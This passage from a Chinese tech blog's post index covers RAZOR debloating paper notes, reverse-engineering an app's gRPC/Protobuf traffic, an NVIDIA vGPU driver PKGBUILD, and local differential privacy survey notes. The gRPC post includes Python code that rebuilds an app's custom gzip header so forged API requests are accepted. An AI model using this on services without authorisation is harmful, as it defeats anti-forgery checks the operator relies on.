concretize indirect calls/jumps, and insert fault handling code 编译汇编文件成为包含必要的机器码的目标文件(object file) 复制目标文件中的机器码到原始二进制程序中一个新的代码段(code section) 修改新代码段来修复对原始代码和数据的所有引？ 设置原始代码段不可被执行，仍保留在 debloated 后的程序中（可能还会被读取？比如实现 switch 的 jump table）  具体实现 代码开源在 https://github.com/cxreet/razor\n有提供使用说明 https://github.com/cxreet/razor/wiki，从测试小程序到 coreutils 都有\ndocker pull chenxiong/razor:0.04 可以直接体验\n效果验证 3 个 benchmark，前两者用软件方式 trace，后两者用硬件方式 trace:\n 29 SPEC CPU2006，包含 12 个 C 程序，7 个 C++ 程序和10个 Fortran 程序 论文 CHISEL 中用到的 10 个 coreutils 程序 Firefox 和 FoxitReader  在以下五个方面和 CHISEL 对比：\n Code Reduction: 从精简效果上看 CHISEL 略胜一筹，但其影响程序鲁棒性 Functionality: RAZOR 使用启发式方法扩展 related-code 后，测试功能完全正常，CHISEL 则有 wrong operation, infinite loop, crash, missed output 等问题 Security: 选择一些 CVE，部分是可在对应 binary 上利用的，部分已经被修复。CHISEL 消除代码的策略激进，消除了更多 CVE 但导致一些原本已修复的 CVE 又可被利用，相比之下 RAZOR 更稳健。另外消除 ROP gadget 数量也是 CHISEL 略胜，因为 RAZOR 更关注防止 forward-edge control-flow attack，这种攻击利用函数指针而不是返回地址 Performance: RAZOR 的构建速度在秒级，远胜 CHISEL。运行时开销也平均只增加 1.7%，主要是由于 indirect call concretization Practicality: 在 Firefox 和 Foxit Reader 这两个大型应用上测试打开网页和 PDF，在启发式方法下都取得了不错的效果  讨论与相关工作 Best-effort inference: 启发式方法虽然不能保证 completeness 和 soundness，但广泛用于二进制分析和重写中\nControl-flow Integrity (CFI): 控制流完整性检测和 Software Debloating 其实是互相促进的，debloating 可实现粗粒度的 CFI，而 RAZOR 也利用了 binCFI 中的技术来做优化。\nRemoving original code: 其实目前 RAZOR 还保留原本的 code section 只是设成 read-only，因为其中的数据可能还会被读取，比如 llvm 会对 switch 语句在 code section 中生成 jump table，需要被 indirect jump 读取。要完全移除也可以先分析对 code section 的读取，再在重写时将数据 reloacate 到新的 data section 并更新相关代码来访问新的位置。\n相关工作有针对 library, source code, container, hardware 的 debloating，以及 delta debugging，在这些方面 RAZOR 也有可能提供新的思路。\n","date":"2022-02-08T13:46:52Z","permalink":"https://chinggg.github.io/post/razor/","tags":["论文笔记","安全"],"title":"RAZOR: Software Debloating"},{"categories":["安全"],"contents":"逆向时开始见到 gRPC 协议和 Protobuf 编码在私信、直播等领域使用，故记录之。\ngRPC 是基于 HTTP/2.0 来传输的，但 Fiddler 5 似乎尚不支持，在抓包某 App 时发现了神奇的现象，同样的功能，Fiddler 抓到了 HTTP/1.1 的请求，mitmproxy 抓到了 HTTP/2.0 的请求，URL 的 Path 相同而 Host 不一样，猜测是客户端做了 FallBack。\n抓到包后其实有两种选择，最开始我找到发请求的地点，闷头逆向 Java 层代码，打印数据（注意是否有类继承 com.google.protobuf.GeneratedMessageLite），一个个字段找生成的位置，但因为不熟悉客户端所用组件，往往耗时耗力找不到关键，而且考虑到之后的目标是正向构造请求，确定 proto 协议才是关键，与其往客户端实现层分析，不如直接从报文 body 着手。\nProtobuf 高效的一大原因在于其将字段名放在双方持有的 proto 中，传输的数据仅有 enum 编号，但数据本身的值却完全是可以解读的，protoc --decode_raw \u0026lt; file 就能打印出解析后的数据，也有在线网站，但我刚开始复制报文 body 却总是解析失败，mitmproxy 可选择以 protobuf 解码数据，却也失败，关键在于传输的是 Length-Prefixed-Message 而非直接是 protobuf，即第一个 byte 值为 1/0 表示是否压缩，再 4 byte (big endian) 表示消息长度，剩下的才是消息，而如果有压缩的话，还要再把消息解压缩，比如最常见的 gzip，其前 10 byte 又是压缩相关的头部信息，而 App 可能会刻意设置 gzip header 以防伪造，若非提前看到 哔哩哔哩视频和字幕接口分析 这篇文章，必然踩坑。\ndef gzip_compress(buf: bytes, bz=True) -\u0026gt; bytes: compressed = gzip.compress(buf) if bz: # special header compressed = compressed[:3] + bytes(7*[0]) + compressed[10:] return compressed def length_prefixed_enc(buf: bytes, compress: bool = True) -\u0026gt; bytes: buf = gzip_compress(buf) if compress else buf return struct.pack(\u0026quot;!bl\u0026quot;, compress, len(buf)) + buf def length_prefixed_dec(msg: bytes) -\u0026gt; bytes: compress, length = struct.unpack(\u0026quot;!bl\u0026quot;, msg[:5]) buf = gzip.decompress(msg[5:5+length]) if compress else msg[5:5+length] return buf  将 Protobuf 的原始数据提取出后，即可用 protoc 解得没有字段名的原始数据，配合动静态分析获得的值，一般就能手写对应的 proto 文件，接着就由 proto 文件生成不同语言的对应代码，可以尝试直接调用 gRPC，也可以仅生成 Protobuf 的 msg 对象再 SerializeToString()，生成 Length-Prefixed-Message 作为 body，添加 header \u0026quot;Content-Type\u0026quot;: \u0026quot;application/grpc\u0026quot;，这样构造 HTTP 请求亦可生效。\n","date":"2022-01-25T11:30:09+08:00","permalink":"https://chinggg.github.io/post/grpc-protobuf/","tags":["逆向","编码"],"title":"gRPC Protobuf 逆向初探"},{"categories":[""],"contents":"vps2arch 没啥好说的，上不了网注意改 systemd-networkd 的配置，提前 pacman -S vi vim base-devel\nNVIDIA nvidia 和 nvidia-lts 都是最新版 nvidia 驱动，一般内核新不是问题，往往是驱动太新，执行 nvidia-smi 后提示无法与 driv，lsmod | grep nvidia 没有结果，/dev 下也没有 nvidia，dmesg 才发现提示不支持。\n在官网查看对应型号显卡的最新驱动，记住版本号，比如 Tesla T4 是 470.82.01，若该型号官网驱动版本低于 nvidia，从 AUR 安装 nvidia-470xx-dkms 或 nvidia-390xx-dkms（其实 AUR 不止这些但以上两者是 Wiki 推荐)\n观察以上两个包的 PKGBUILD，发现都是从 https://download.nvidia.com/XFree86/Linux-x86_64/ 下载对应版本的 .run 文件，但直接执行 .run 文件不是 The Arch Way (容易滚挂？咱也没试过)，最好还是将 NVIDIA driver 纳入包管理器的控制，可以修改 PKGBUILD 中的 pkgver，自行打包 以安装任意版本的驱动，即 pacman -S devtools 后，执行 extra-x86_64-build 根据 PKGBUILD 创建干净的环境打包，再 pacman -U *.pkg.tar.zst 安装。若需要自行创建测试环境，可用 systemd-nspawn。\n为 NVIDIA 驱动打包，可参看 Listing of Installed Components 了解各文件的作用，.run 文件解压后也有 .manifest 简单列出路径和权限。另外 AUR 可参考的版本较少，可去 Manjaro GitLab 偷包，另外 diff -qr dir1/ dir2/ 可以比较不同驱动解压后目录中的文件异同，方便改包。\nvGPU 从 470xx 到 390xx，dmesg 日志都还是报错不支持，突然意识到机器是 vGPU 而非直通显卡，需要装 grid 驱动。可能是 license 的缘故，AUR 没有基于 grid 驱动的现成包，nvidia-merged 似乎是支持 vGPU 但安装提示本机并不是跑在 KVM 上的 vGPU，所以只能手打包。NVIDIA 官网没有提供 grid 驱动的公开直链，还好 Google Cloud 可以直接下载 NVIDIA-Linux-x86_64-${pkgver}-grid.run。\n基于 470xx 的 PKGBUILD 删减一通后居然打出了 470xx grid 的包，还真能装上，module 和 dev 都有了，nvidia-smi 不会立刻报错，而是等待许久后来一句 No devices were found，dmesg 中没有原来的显眼报错，而是 NVRM: RmInitAdapter failed!，肯定还是有问题了，nvidia-persistence 也无法启动的。\nDowngrade Kernel 查阅内网文档说是显卡驱动版本受限于母机，只支持到 450.102.04，那再手打 450xx 的包，结果发现安装 dkms 时总是编译报错，看 make.log 应该是内核源码中某些定义有变动，有类似的 patch https://bbs.archlinux.org/viewtopic.php?id=268421，但改了一个还没完，后面继续出现更多报错，短时间内估计搞不定，不如退而求其次，降 kernel 版本。\n根据 cuda-toolkit-release-notes 的 Table 3，450.102.04 对应 CUDA 11.0.3 Update 1，查看 cuda-installation-guide-linux v11.0.3，从表 Table 1. Native Linux Distribution Support in CUDA 11.0 推测官方最高支持到 Kernel 5.4.0，故降级到 linux-lts54，并 yay -S linux-lts54-headers\n安装 kernel 后重启前一定记得 grub-mkconfig，然后删除 /usr/lib/modules/ 下之前版本的残留文件夹，否则 dkms 仍会尝试编译该版本于是报错，未找到模块的错误 PKGBUILD 中再看是否可删除多余的命令，最后终于装成功，重启后 nvidia-smi 成功出现了梦寐以求的界面！\npython-pytorch-cuda 直接装，居然也 available 而不用装老版本，因为 cuda-toolkit-release-notes 的 Table 2 表明直到 CUDA 11.5 的 Minimum Required Driver Version 还是 \u0026gt;=450.80.02\ngridd 然而事情并没有那么简单，这样装上驱动后炼丹似乎完全没效果，这才想起来 vGPU 是需要 license 的，可装上后完全没有体现，因为我打包时压根没把 nvidia-gridd 放进去，于是打进包里，然后在 /etc/nvidia/gridd.conf 填入 license server address，启用服务后报错 Error requesting D-Bus name (Connection \u0026quot;:1.14\u0026quot; is not allowed to own the service \u0026quot;nvidia.grid.server\u0026quot; due to security policies in the configuration file)\n成功就在眼前，这个报错虽然非常小众，但问题依然能定位到 dbus配置，在 /usr/share/dbus-1/system.d 下创建 nvidia.grid.server.conf，写入如下配置：\n\u0026lt;!DOCTYPE busconfig PUBLIC \u0026quot;-//freedesktop//DTD D-Bus Bus Configuration 1.0//EN\u0026quot; \u0026quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\u0026quot;\u0026gt; \u0026lt;busconfig\u0026gt; \u0026lt;policy context=\u0026quot;default\u0026quot;\u0026gt; \u0026lt;allow own=\u0026quot;nvidia.grid.server\u0026quot;/\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;/busconfig\u0026gt;  果然不再报错，重启服务后显示成功获取，nvidia-smi -q | grep -i license 也证实了已变成 Licensed 状态。\nSummary 没有学会炼丹，却再次锻炼了折腾能力，最开始只会盲从 Arch Wiki，转折点是看到 /data 目录下的残留驱动而意识到应使用 vGPU 特供 grid 驱动，从而被迫学习改包打包，虽然成功打包并装上，但报错并发现到机器最高只支持 450xx，于是打旧包，这次是安装 dkms 总出错，从而对驱动和内核版本之间的关系有了更深理解，事后看 NVIDIA 官网的文档和表格大致明白了 Kernel, Driver, CUDA 这三者版本的关联。\n最后附上自制 nvidia-450xx-utils 的 PKGBUILD\n# Maintainer: Jonathon Fernyhough \u0026lt;jonathon+m2x+dev\u0026gt; # Contributor: Sven-Hendrik Haase \u0026lt;svenstaro@gmail.com\u0026gt; # Contributor: Thomas Baechler \u0026lt;thomas@archlinux.org\u0026gt; # Contributor: James Rayner \u0026lt;iphitus@gmail.com\u0026gt; pkgbase=nvidia-450xx-utils pkgname=('nvidia-450xx-utils' 'opencl-nvidia-450xx' 'nvidia-450xx-dkms') pkgver=450.102.04 pkgrel=2 arch=('x86_64') url=\u0026quot;http://www.nvidia.com/\u0026quot; license=('custom') options=('!strip') _pkg=\u0026quot;NVIDIA-Linux-x86_64-${pkgver}-grid\u0026quot; source=('nvidia-drm-outputclass.conf' 'nvidia-450xx-utils.sysusers' 'nvidia-450xx.rules' \u0026quot;https://storage.googleapis.com/nvidia-drivers-us-public/GRID/GRID11.3/${_pkg}.run\u0026quot;) sha512sums=('de7116c09f282a27920a1382df84aa86f559e537664bb30689605177ce37dc5067748acf9afd66a3269a6e323461356592fdfc624c86523bf105ff8fe47d3770' '4b3ad73f5076ba90fe0b3a2e712ac9cde76f469cd8070280f960c3ce7dc502d1927f525ae18d008075c8f08ea432f7be0a6c3a7a6b49c361126dcf42f97ec499' 'a0ceb0a6c240cf97b21a2e46c5c212250d3ee24fecef16aca3dffb04b8350c445b9f4398274abccdb745dd0ba5132a17942c9508ce165d4f97f41ece02b0b989' '523070e9e458f2da50df0f6dd35445ed824cf3b4ce2c3e191d58718a4ed638cfc644852b8330fb3da0444811431da7bf88f195e9aed1fa8615f92b8d1e941892') create_links() { # create soname links find \u0026quot;$pkgdir\u0026quot; -type f -name '*.so*' ! -path '*xorg/*' -print0 | while read -d $'\\0' _lib; do _soname=$(dirname \u0026quot;${_lib}\u0026quot;)/$(readelf -d \u0026quot;${_lib}\u0026quot; | grep -Po 'SONAME.*: \\[\\K[^]]*' || true) _base=$(echo ${_soname} | sed -r 's/(.*)\\.so.*/\\1.so/') [[ -e \u0026quot;${_soname}\u0026quot; ]] || ln -s $(basename \u0026quot;${_lib}\u0026quot;) \u0026quot;${_soname}\u0026quot; [[ -e \u0026quot;${_base}\u0026quot; ]] || ln -s $(basename \u0026quot;${_soname}\u0026quot;) \u0026quot;${_base}\u0026quot; done } prepare() { sh \u0026quot;${_pkg}.run\u0026quot; --extract-only cd \u0026quot;${_pkg}\u0026quot; bsdtar -xf nvidia-persistenced-init.tar.bz2 cd kernel sed -i \u0026quot;s/__VERSION_STRING/${pkgver}/\u0026quot; dkms.conf sed -i 's/__JOBS/`nproc`/' dkms.conf sed -i 's/__DKMS_MODULES//' dkms.conf sed -i '$iBUILT_MODULE_NAME[0]=\u0026quot;nvidia\u0026quot;\\ DEST_MODULE_LOCATION[0]=\u0026quot;/kernel/drivers/video\u0026quot;\\ BUILT_MODULE_NAME[1]=\u0026quot;nvidia-uvm\u0026quot;\\ DEST_MODULE_LOCATION[1]=\u0026quot;/kernel/drivers/video\u0026quot;\\ BUILT_MODULE_NAME[2]=\u0026quot;nvidia-modeset\u0026quot;\\ DEST_MODULE_LOCATION[2]=\u0026quot;/kernel/drivers/video\u0026quot;\\ BUILT_MODULE_NAME[3]=\u0026quot;nvidia-drm\u0026quot;\\ DEST_MODULE_LOCATION[3]=\u0026quot;/kernel/drivers/video\u0026quot;' dkms.conf # Gift for linux-rt guys sed -i 's/NV_EXCLUDE_BUILD_MODULES/IGNORE_PREEMPT_RT_PRESENCE=1 NV_EXCLUDE_BUILD_MODULES/' dkms.conf } package_opencl-nvidia-450xx() { pkgdesc=\u0026quot;OpenCL implemention for NVIDIA\u0026quot; depends=('zlib') optdepends=('opencl-headers: headers necessary for OpenCL development') provides=('opencl-driver' 'opencl-nvidia') conflicts=('opencl-nvidia') cd \u0026quot;${_pkg}\u0026quot; # OpenCL install -Dm644 nvidia.icd \u0026quot;${pkgdir}/etc/OpenCL/vendors/nvidia.icd\u0026quot; install -D \u0026quot;libnvidia-compiler.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-compiler.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-opencl.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-opencl.so.${pkgver}\u0026quot; create_links mkdir -p \u0026quot;${pkgdir}/usr/share/licenses\u0026quot; ln -s nvidia-utils \u0026quot;${pkgdir}/usr/share/licenses/opencl-nvidia\u0026quot; } package_nvidia-450xx-dkms() { pkgdesc=\u0026quot;NVIDIA drivers - module sources\u0026quot; depends=('dkms' \u0026quot;nvidia-450xx-utils=$pkgver\u0026quot; 'libglvnd') provides=('NVIDIA-MODULE') cd ${_pkg} install -dm 755 \u0026quot;${pkgdir}\u0026quot;/usr/src cp -dr --no-preserve='ownership' kernel \u0026quot;${pkgdir}/usr/src/nvidia-${pkgver}\u0026quot; install -Dt \u0026quot;${pkgdir}/usr/share/licenses/${pkgname}\u0026quot; -m644 \u0026quot;${srcdir}/${_pkg}/LICENSE\u0026quot; } package_nvidia-450xx-utils() { pkgdesc=\u0026quot;NVIDIA drivers utilities\u0026quot; depends=('xorg-server') optdepends=('xorg-server-devel: nvidia-xconfig' 'opencl-nvidia-450xx: OpenCL support') conflicts=('nvidia-libgl' 'nvidia-utils') provides=('vulkan-driver' 'opengl-driver' 'nvidia-libgl' 'nvidia-utils') install=\u0026quot;${pkgname}.install\u0026quot; cd \u0026quot;${_pkg}\u0026quot; # Check http://us.download.nvidia.com/XFree86/Linux-x86_64/${pkgver}/README/installedcomponents.html # for hints on what needs to be installed where. # X driver install -D nvidia_drv.so \u0026quot;${pkgdir}/usr/lib/xorg/modules/drivers/nvidia_drv.so\u0026quot; # GLX extension module for X install -D \u0026quot;libglxserver_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/nvidia/xorg/libglxserver_nvidia.so.${pkgver}\u0026quot; # Ensure that X finds glx ln -s \u0026quot;libglxserver_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/nvidia/xorg/libglxserver_nvidia.so.1\u0026quot; ln -s \u0026quot;libglxserver_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/nvidia/xorg/libglxserver_nvidia.so\u0026quot; install -D \u0026quot;libGLX_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libGLX_nvidia.so.${pkgver}\u0026quot; # OpenGL libraries install -D \u0026quot;libEGL_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libEGL_nvidia.so.${pkgver}\u0026quot; install -D \u0026quot;libGLESv1_CM_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libGLESv1_CM_nvidia.so.${pkgver}\u0026quot; install -D \u0026quot;libGLESv2_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libGLESv2_nvidia.so.${pkgver}\u0026quot; install -Dm644 \u0026quot;10_nvidia.json\u0026quot; \u0026quot;${pkgdir}/usr/share/glvnd/egl_vendor.d/10_nvidia.json\u0026quot; # OpenGL core library install -D \u0026quot;libnvidia-glcore.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-glcore.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-eglcore.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-eglcore.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-glsi.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-glsi.so.${pkgver}\u0026quot; # misc install -D \u0026quot;libnvidia-ifr.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-ifr.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-fbc.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-fbc.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-encode.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-encode.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-cfg.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-cfg.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-ml.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-ml.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-glvkspirv.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-glvkspirv.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-allocator.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-allocator.so.${pkgver}\u0026quot; # Vulkan ICD install -Dm644 \u0026quot;nvidia_icd.json\u0026quot; \u0026quot;${pkgdir}/usr/share/vulkan/icd.d/nvidia_icd.json\u0026quot; install -Dm644 \u0026quot;nvidia_layers.json\u0026quot; \u0026quot;${pkgdir}/usr/share/vulkan/implicit_layer.d/nvidia_layers.json\u0026quot; # VDPAU install -D \u0026quot;libvdpau_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/vdpau/libvdpau_nvidia.so.${pkgver}\u0026quot; # nvidia-tls library install -D \u0026quot;libnvidia-tls.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-tls.so.${pkgver}\u0026quot; # CUDA install -D \u0026quot;libcuda.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libcuda.so.${pkgver}\u0026quot; install -D \u0026quot;libnvcuvid.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvcuvid.so.${pkgver}\u0026quot; # PTX JIT Compiler (Parallel Thread Execution (PTX) is a pseudo-assembly language for CUDA) install -D \u0026quot;libnvidia-ptxjitcompiler.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-ptxjitcompiler.so.${pkgver}\u0026quot; # raytracing install -D \u0026quot;libnvoptix.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvoptix.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-rtcore.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-rtcore.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-cbl.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-cbl.so.${pkgver}\u0026quot; # NGX install -D \u0026quot;libnvidia-ngx.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-ngx.so.${pkgver}\u0026quot; # Optical flow install -D \u0026quot;libnvidia-opticalflow.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-opticalflow.so.${pkgver}\u0026quot; # Only for GRID, maybe useless install -D \u0026quot;libFlxCore64.so.2018.02\u0026quot; \u0026quot;${pkgdir}/usr/lib/libFlxCore64.so.2018.02\u0026quot; install -D \u0026quot;libFlxComm64.so.2018.02\u0026quot; \u0026quot;${pkgdir}/usr/lib/libFlxComm64.so.2018.02\u0026quot; # DEBUG install -D nvidia-debugdump \u0026quot;${pkgdir}/usr/bin/nvidia-debugdump\u0026quot; # nvidia-xconfig install -D nvidia-xconfig \u0026quot;${pkgdir}/usr/bin/nvidia-xconfig\u0026quot; install -Dm644 nvidia-xconfig.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-xconfig.1.gz\u0026quot; # nvidia-settings install -D -m755 nvidia-settings \u0026quot;${pkgdir}/usr/bin/nvidia-settings\u0026quot; install -D -m644 nvidia-settings.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-settings.1.gz\u0026quot; install -D -m644 nvidia-settings.desktop \u0026quot;${pkgdir}/usr/share/applications/nvidia-settings.desktop\u0026quot; install -D -m644 nvidia-settings.png \u0026quot;${pkgdir}/usr/share/pixmaps/nvidia-settings.png\u0026quot; install -D -m755 \u0026quot;libnvidia-gtk2.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-gtk2.so.${pkgver}\u0026quot; install -D -m755 \u0026quot;libnvidia-gtk3.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-gtk3.so.${pkgver}\u0026quot; sed -e 's:__UTILS_PATH__:/usr/bin:' -e 's:__PIXMAP_PATH__:/usr/share/pixmaps:' -i \u0026quot;${pkgdir}/usr/share/applications/nvidia-settings.desktop\u0026quot; # nvidia-bug-report install -D nvidia-bug-report.sh \u0026quot;${pkgdir}/usr/bin/nvidia-bug-report.sh\u0026quot; # nvidia-smi install -D nvidia-smi \u0026quot;${pkgdir}/usr/bin/nvidia-smi\u0026quot; install -Dm644 nvidia-smi.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-smi.1.gz\u0026quot; # nvidia-cuda-mps install -D nvidia-cuda-mps-server \u0026quot;${pkgdir}/usr/bin/nvidia-cuda-mps-server\u0026quot; install -D nvidia-cuda-mps-control \u0026quot;${pkgdir}/usr/bin/nvidia-cuda-mps-control\u0026quot; install -Dm644 nvidia-cuda-mps-control.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-cuda-mps-control.1.gz\u0026quot; # nvidia-modprobe # This should be removed if nvidia fixed their uvm module! install -Dm4755 nvidia-modprobe \u0026quot;${pkgdir}/usr/bin/nvidia-modprobe\u0026quot; install -Dm644 nvidia-modprobe.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-modprobe.1.gz\u0026quot; # nvidia-persistenced install -D nvidia-persistenced \u0026quot;${pkgdir}/usr/bin/nvidia-persistenced\u0026quot; install -Dm644 nvidia-persistenced.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-persistenced.1.gz\u0026quot; install -Dm644 nvidia-persistenced-init/systemd/nvidia-persistenced.service.template \u0026quot;${pkgdir}/usr/lib/systemd/system/nvidia-persistenced.service\u0026quot; sed -i 's/__USER__/nvidia-persistenced/' \u0026quot;${pkgdir}/usr/lib/systemd/system/nvidia-persistenced.service\u0026quot; # nvidia-gridd install -Dm4755 nvidia-gridd \u0026quot;${pkgdir}/usr/bin/nvidia-gridd\u0026quot; install -Dm644 nvidia-gridd.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-gridd.1.gz\u0026quot; install -Dm644 gridd.conf.template \u0026quot;${pkgdir}/etc/nvidia/gridd.conf.template\u0026quot; install -Dm644 init-scripts/systemd/nvidia-gridd.service \u0026quot;${pkgdir}/usr/lib/systemd/system/nvidia-gridd.service\u0026quot; # application profiles install -Dm644 nvidia-application-profiles-${pkgver}-rc \u0026quot;${pkgdir}/usr/share/nvidia/nvidia-application-profiles-${pkgver}-rc\u0026quot; install -Dm644 nvidia-application-profiles-${pkgver}-key-documentation \u0026quot;${pkgdir}/usr/share/nvidia/nvidia-application-profiles-${pkgver}-key-documentation\u0026quot; install -Dm644 LICENSE \u0026quot;${pkgdir}/usr/share/licenses/nvidia-utils/LICENSE\u0026quot; install -Dm644 README.txt \u0026quot;${pkgdir}/usr/share/doc/nvidia/README\u0026quot; install -Dm644 NVIDIA_Changelog \u0026quot;${pkgdir}/usr/share/doc/nvidia/NVIDIA_Changelog\u0026quot; cp -r html \u0026quot;${pkgdir}/usr/share/doc/nvidia/\u0026quot; ln -s nvidia \u0026quot;${pkgdir}/usr/share/doc/nvidia-utils\u0026quot; install -Dm644 \u0026quot;${srcdir}/nvidia-450xx-utils.sysusers\u0026quot; \u0026quot;${pkgdir}/usr/lib/sysusers.d/$pkgname.conf\u0026quot; install -Dm644 \u0026quot;${srcdir}/nvidia-450xx.rules\u0026quot; \u0026quot;$pkgdir\u0026quot;/usr/lib/udev/rules.d/60-nvidia-450xx.rules # distro specific files must be installed in /usr/share/X11/xorg.conf.d install -m755 -d \u0026quot;$pkgdir/usr/share/X11/xorg.conf.d\u0026quot; install -Dm644 \u0026quot;${srcdir}/nvidia-drm-outputclass.conf\u0026quot; \u0026quot;${pkgdir}/usr/share/X11/xorg.conf.d/10-nvidia-drm-outputclass.conf\u0026quot; echo \u0026quot;blacklist nouveau\u0026quot; | install -Dm644 /dev/stdin \u0026quot;${pkgdir}/usr/lib/modprobe.d/${pkgname}.conf\u0026quot; echo \u0026quot;nvidia-uvm\u0026quot; | install -Dm644 /dev/stdin \u0026quot;${pkgdir}/usr/lib/modules-load.d/${pkgname}.conf\u0026quot; create_links }  ","date":"2022-01-17T15:03:15+08:00","permalink":"https://chinggg.github.io/post/vps2arch-nvidia/","tags":["",""],"title":"vps2arch NVIDIA vGPU"},{"categories":["论文"],"contents":"A survey of local differential privacy for securing internet of vehicles\nIntro IoV facilitates human’s life but benefits come with huge price of data privacy.\nIn academia, differential privacy (DP) is proposed and regarded as an extremely strong privacy standard, which formalizes both the degree of privacy preservation and data utility.\nBut DP suffers from a drawback in many practical scenarios because the paradigm of DP relies on a third party.\nLDP has the potential to guarantee the data privacy in IoV, the third party does not collect the exact data of each individual, and yet still be able to compute the correct statistical results.\nContributions of this paper:\n first to survey existing work about LDP in terms of advantages, disadvantages, computation complexity, and the privacy budget first to investigate the potential applications of LDP in securing IoV and highlight the new challenges  LDP researches Data publication Data publication based on local differential privacy mainly uses non-interactive framework to release statistical information of sensitive data and enables the released data to meet the needs of data analysis at the same time. Commonly used data publication technologies mainly include histogram, partitioning, and sampling filter.\nThe earliest research RAPPOR proposed to collect crowd-sourced statistics from users’ data without violating users’ data privacy, but it has two disadvantages:\n high communication cost between users and the data collector data collector is required to collect candidate string lists in advance for frequency statistics  To reduce the communication overhead, S-Hist proposed to randomly select bits using randomized response techniques to perturb users’ data and send the perturbed data to the collector.\nTo deal with the second drawback of RAPPOR, the second drawback of RAPPOR, O-RAPPOR based on the unknown values of variables and designed hash mapping and grouping operations.\nMachine Learning The main idea of LDP-based machine learning is that users locally perturb parameter updates of machine learning on their vehicle data using LDP and the server gets the global parameter updates via collecting local parameter updates from users.\nRegression analysis based on LDP is another research topic. Regression analysisis a commonly used data classification method in machine learning, which determines the quantitative relationship of two or more attributes in the input datasets. Regression analysis consists of two kinds of functions: One is the prediction function; the other is the objective function, or the risk function. It will leak the prediction function and the data information in the datasets when publishing the weight vector. To protect such data privacy in machine learning, a variety of work has applied LDP to regression analysis.\nWhether add noise to weight vector or objective function, the cost of calculating the sensitivity of the weight vector is still high.\nTo address the problems above, FM (functional mechanism) was proposed, which achieved the regression analysis while meeting local differential privacy. FM first perturbed the sum of objective functions corresponding to each data tuple in the datasets and then obtained the weight vector by minimizing the target function. In this process, the noise scale is not determined by the sensitivity of the weight vector, but by expressing the objective function as a polynomial, avoiding the computation of the sensitivity of the weight vector.\nIn summary, the SVM classification based on Laplace has low classification accuracy and larger noise, while SVM classification based on perturbing objective functions is only applicable to specific objective functions. Therefore, how to design a perturbation mechanism with high precision and applications to multiple objective functions is the future research topic.\nQuery processing The query processing technologies based on local differential privacy mainly focus on how to respond to queries with less privacy budget and lower error.\nFor example, linear queries in the interactive framework, batch processing of linear queries includes matrix mechanisms and low-rank mechanisms.\nAnother kind of work focused on process users’ queries based on division methods.\nIn summary, the matrix mechanism is prone to suboptimal results in practice; the low-rank mechanism only considers the correlation of the load matrix and does not take into account the relevance of the data itself. Therefore, how to design a general batch query processing mechanism from the actual relevance of the data itself is a future research direction.\nApplication of LDP system Frank et al. first introduced the local differential privacy method to the recommendation system. They assumed that the recommendation system is not trusted. The attacker can estimate the user’s private information by analyzing the historical data of the recommendation system. So it is necessary to interfere with the input of the recommended system. When analyzing the relationship between projects, they first establish a project similarity covariance matrix and add Laplace noise to the matrix to implement interference, and then submit it to the 